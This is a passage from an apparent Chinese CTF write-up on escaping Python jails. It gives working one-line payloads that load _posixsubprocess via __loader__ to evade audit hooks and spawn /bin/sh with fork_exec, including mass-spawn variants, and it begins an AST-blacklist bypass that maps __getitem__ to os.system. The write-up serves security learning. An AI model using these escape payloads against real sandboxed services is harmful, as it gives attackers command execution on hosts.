err:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(err)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(complie_code, dict_global)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; Exception &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; err:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(err)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这题已经几乎把所有的 hook 给 ban 掉了。参考这个 writeup：&lt;a class=&#34;link&#34; href=&#34;https://ctftime.org/writeup/31883&#34;&gt;https://ctftime.org/writeup/31883 &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;也就是利用 &lt;code&gt;_posixsubprocess.fork_exec&lt;/code&gt;  来实现 RCE。不过需要注意，不同的 python 版本的 &lt;code&gt;_posixsubprocess.fork_exec&lt;/code&gt;  接受的参数个数可能不一样：例如本地 WSL 的 python 版本为 3.8.10，该函数接受 17 个参数；而远程 python 版本为 3.10.6，该函数和上面的 writeup 接受 21 个参数。&lt;/p&gt;
&lt;p&gt;而且注意到，直接 &lt;code&gt;import _posixsubprocess&lt;/code&gt;  的话，会触发 &lt;code&gt;audit hook&lt;/code&gt; ：&lt;/p&gt;
&lt;p&gt;可以通过如下方法绕过：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__builtins__[&amp;#x27;__loader__&amp;#x27;].load_module(&amp;#x27;_posixsubprocess&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__loader__.load_module(&amp;#x27;_posixsubprocess&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;而且因为是多次 exec，所以我们可以输入多行代码：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__loader__.load_module(&amp;#x27;_posixsubprocess&amp;#x27;).fork_exec([b&amp;quot;/bin/sh&amp;quot;], [b&amp;quot;/bin/sh&amp;quot;], True, (), None, None, -1, -1, -1, -1, -1, -1,*(os.pipe()), False, False, None, None, None, -1, None)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/09/lo3wgxhXz1eri89.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;calc_jail_beginner_level61&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level61&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level6.1&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  _                _                           _       _ _   _                _   __&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; | |              (_)                         (_)     (_) | | |              | | / /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; | &lt;span class=&#34;string&#34;&gt;&amp;#x27;_ \ / _ \/ _` | | &amp;#x27;&lt;/span&gt;_ \| &lt;span class=&#34;string&#34;&gt;&amp;#x27;_ \ / _ \ &amp;#x27;&lt;/span&gt;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | &lt;span class=&#34;string&#34;&gt;&amp;#x27;_ \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;              __/ |                          _/ |&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;             |___/                          |__/                                                                        &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Welcome to the python jail&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Let&amp;#x27;&lt;/span&gt;s have an beginner jail of calc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Enter your expression &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; I will evaluate it &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; you.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;White &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt; of audit hook ===&amp;gt; builtins.&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;,builtins.&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;/result,&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;compile&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Some code of python jail:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    dict_global = &lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    input_code = &lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    complie_code = &lt;span class=&#34;built_in&#34;&gt;compile&lt;/span&gt;(input_code, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;string&amp;gt;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;single&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(complie_code, dict_global)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;和上面那题不同，在这里我们仅有一次代码执行机会。&lt;/p&gt;
&lt;p&gt;不过不慌，我们之前提到了 python 3.8 引入的海象运算符，还是可以通过用海象运算符和 &lt;code&gt;list&lt;/code&gt;  的方式弄出代码：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[os := &lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;), _posixsubprocess := __loader__.load_module(&lt;span class=&#34;string&#34;&gt;&amp;#x27;_posixsubprocess&amp;#x27;&lt;/span&gt;), _posixsubprocess.fork_exec([&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;], [&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;], &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;, (), &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, *(os.pipe()), &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;但是 payload 发送过去之后，能弹 shell，但是 shell 秒关，输入任何命令也不见回显。&lt;/p&gt;
&lt;p&gt;可以看看假设我们暴力多次尝试起 shell，会发生什么：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[os := &lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;), _posixsubprocess := __loader__.load_module(&lt;span class=&#34;string&#34;&gt;&amp;#x27;_posixsubprocess&amp;#x27;&lt;/span&gt;), [_posixsubprocess.fork_exec([&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;], [&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;], &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;, (), &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, *(os.pipe()), &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;)]]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;先将要执行的 shell 命令复制进剪贴板，然后在它疯狂回显的时候，疯狂粘贴回车，看看能不能执行。结果居然有一定概率会回显执行命令的结果！于是就在这种破烂 shell 下拿到了 flag……&lt;/p&gt;
&lt;p&gt;不过还有更加优雅（？）的做法：利用 &lt;code&gt;itertools&lt;/code&gt;  中的&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/34139147&#34;&gt;无限迭代器 &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;来暴力起 shell。不过实测好像并达不到无限：猜测远程起进程的个数有限，到一定数目之后会炸：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[os := &lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;), itertools := __loader__.load_module(&lt;span class=&#34;string&#34;&gt;&amp;#x27;itertools&amp;#x27;&lt;/span&gt;), _posixsubprocess := __loader__.load_module(&lt;span class=&#34;string&#34;&gt;&amp;#x27;_posixsubprocess&amp;#x27;&lt;/span&gt;), [_posixsubprocess.fork_exec([&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;], [&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;], &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;, (), &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, *(os.pipe()), &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; itertools.count(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)]]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;calc_jail_beginner_level7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level7&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level7&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;G&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=================================================================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;==        Black List AST:                                                                      ==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;==                       &amp;#x27;Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef  ==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;==                        Sub,Mult,Div,Del&amp;#x27;                                                    ==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=================================================================================================&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;虽然没有了 import 和 call，但有一个魔术方法&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/149126959&#34;&gt; metaclass &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;。可以通过 metaclass 给类添加属性。&lt;/p&gt;
&lt;p&gt;猜测一下，既然能添加类的属性，那是否可以修改呢？也就是说如果我们将一个类的某一个属性修改为 &lt;code&gt;os.system&lt;/code&gt;  这样的函数，那么这样一来在我们调用的时候就可以执行了。现在的问题是需要一个可以传入字符串的属性，发现正好 &lt;code&gt;__getitem__&lt;/code&gt; 符合条件。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__getitem__&lt;/code&gt; 是用来取列表或者字典的值的一个属性，如果我们将一个类的 &lt;code&gt;__getitem__&lt;/code&gt; 改为 &lt;code&gt;os.system&lt;/code&gt;  的话是不是就可以执行 shell 了哈哈&lt;/p&gt;
&lt;p&gt;举个例子：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;WOOD&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WOOD.__getitem__=os.system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WOOD()[&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;运行后发现执行了 ls 但这样依然无法解决这个题，如果我们将上述代码转为 AST 查看，会发现有 Call 和 Expr&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ast&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;src=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;import os&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;class WOOD():&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;WOOD.__getitem__=os.system&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;WOOD()[&amp;#x27;ls&amp;#x27;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ast_node = ast.parse(src, &lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;, mode=&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(ast.dump(ast_node))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Module(body=[Import(names=[alias(name=&amp;#x27;os&amp;#x27;, asname=None)]), ClassDef(name=&amp;#x27;WOOD&amp;#x27;, bases=[], keywords=[], body=[Pass()], decorator_list=[]), Assign(targets=[Attribute(value=Name(id=&amp;#x27;WOOD&amp;#x27;, ctx=Load()), attr=&amp;#x27;__getitem__&amp;#x27;, ctx=Store())], value=Attribute(value=Name(id=&amp;#x27;os&amp;#x27;, ctx=Load()), attr=&amp;#x27;system&amp;#x27;, ctx=Load()), type_comment=None), Expr(value=Subscript(value=Call(func=Name(id=&amp;#x27;WOOD&amp;#x27;, ctx=Load()), args=[], keywords=[]), slice=Index(value=Constant(value=&amp;#x27;ls&amp;#x27;, kind=None)), ctx=Load()))], type_ignores=[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;对于如何避开 &lt;code&gt;Expr&lt;/code&gt; ，我们给执行的内容赋值就行。&lt;/p&gt;
